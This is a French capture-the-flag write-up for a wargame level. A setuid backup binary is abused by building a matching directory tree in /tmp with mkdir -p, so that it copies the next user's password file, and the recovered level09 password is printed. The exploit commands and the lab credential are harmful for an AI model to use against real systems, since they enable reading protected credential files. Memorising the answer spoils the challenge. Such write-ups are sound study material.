# Level08

On a un binaire et un dossier **backups**.

Le binaire prend un fichier en argument, il va copier le contenu de ce fichier dans **backups** et écrire dans un fichier **.log** si la copie c'est bien passée.


### **Tests :** ###

En passant un fichier au programme :

```bash
$> echo foo > bar ; ./level08 bar
```

On obtient le comportement attendu :

```bash
$> cat backups/.log
LOG: Starting back up: bar
LOG: Finished back up bar

$> cat backups/bar
foo
```


### **Solution :** ###

En essayant de passer le mot de passe du niveau suivant au binaire on obtient :

```bash
$> ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

À l'aide de `mkdir -p`, on va créer le **breadcrumb** requis dans `/tmp` (le seul endroit où on a les droits pour créer des répertoires) :

```bash
$> mkdir -p /tmp/backups//home/users/level09/
```

Enfin, on va exécuter le programme depuis `tmp` :

```bash
$/tmp> /home/users/level08/level08 /home/users/level09/.pass
```

Comme prévu, on retrouve le `.pass` dans **backups**.

>> fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S